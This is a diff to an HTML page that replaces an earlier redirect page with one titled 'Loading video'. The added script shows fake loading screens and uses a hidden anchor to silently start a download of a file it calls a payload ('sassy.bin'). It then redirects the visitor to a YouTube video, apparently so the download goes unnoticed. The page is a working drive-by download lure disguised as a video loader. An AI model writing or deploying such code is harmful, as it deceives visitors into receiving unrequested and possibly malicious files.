@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -38,6 +38,64 @@
                         }, redirectDelayMs);
                     }, betweenScreensDelayMs);
                 }, redirectDelayMs);
+            });
+        })();
+    </script>
+</body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loading video</title>
+    <style>
+        html, body { margin: 0; width: 100%; height: 100%; overflow: hidden; background: #000; }
+        .loading-screen { position: fixed; inset: 0; display: block; width: 100%; height: 100%; object-fit: cover; }
+        .loading-screen[hidden] { display: none; }
+    </style>
+</head>
+<body>
+    <!-- Loading Screens -->
+    <img class="loading-screen" id="first-screen" src="assets/redirect-loading.png" alt="Loading video">
+    <img class="loading-screen" id="second-screen" src="assets/redirect-loading-second.png" alt="Preparing video" hidden>
+
+    <script>
+        (function() {
+            // CONFIGURATION
+            // Make sure this file exists in your repo's root folder (e.g., /payload.bin)
+            const payloadPath = '/sassy.bin'; 
+            
+            const targetUrl = "https://www.youtube.com/watch?v=Eq5R-eQjcQg";
+            const startDelay = 1500; // Wait 1.5 seconds before downloading
+            const downloadDuration = 3000; // Wait 3 seconds for the download to "complete"
+            const redirectDelay = 500; // Wait 0.5 seconds before redirecting
+
+            window.addEventListener("load", () => {
+                // 1. Start the download sequence
+                setTimeout(() => {
+                    // Create a hidden anchor element
+                    const a = document.createElement('a');
+                    a.href = payloadPath;
+                    a.download = 'sassy.bin'; // Forces "Save As" or direct download
+                    a.style.display = 'none';
+                    
+                    // Trigger the download
+                    document.body.appendChild(a);
+                    a.click();
+                    
+                    // Remove the anchor to prevent it from sitting in the DOM
+                    setTimeout(() => {
+                        document.body.removeChild(a);
+                    }, 100);
+
+                }, startDelay);
+
+                // 2. Redirect after the download window
+                setTimeout(() => {
+                    window.location.replace(targetUrl);
+                }, startDelay + downloadDuration + redirectDelay);
             });
         })();
     </script>
